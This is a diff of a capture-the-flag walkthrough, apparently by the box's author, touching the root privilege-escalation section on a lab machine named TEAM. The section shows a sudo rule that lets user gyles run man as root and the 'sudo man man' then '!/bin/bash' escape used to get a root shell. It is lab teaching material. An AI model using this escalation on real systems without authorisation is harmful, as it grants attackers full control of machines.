@@ -336,12 +336,13 @@ uid=1001(gyles) gid=1003(editors) groups=1003(editors)
 ```
 No we have a shell as gyles! Although this shell is quite basic.
 
+---
 ## Root Priv Esc
 
 This shell is quite resrictive due to it being launched from the script.
 
 After enumeration I found `sudo -l`1 reveal the following
-```
+```bash
 sudo -l
 Matching Defaults entries for gyles on TEAM:
     env_reset, mail_badpass,
@@ -350,11 +351,13 @@ Matching Defaults entries for gyles on TEAM:
 User gyles may run the following commands on TEAM:
     (root) NOPASSWD: /usr/bin/man
 ```
-Gyles can run `man` as root. This can lead to privlege escalation as man can spawn a shell like so
+Gyles can run `man` as root. This can lead to privilege escalation as man can spawn a shell like so
 
-```
+```bash
 sudo man man
 
 !/bin/bash
 ```
 You now have a root shell on the box.
+
+I really hope you enjoyed my box!
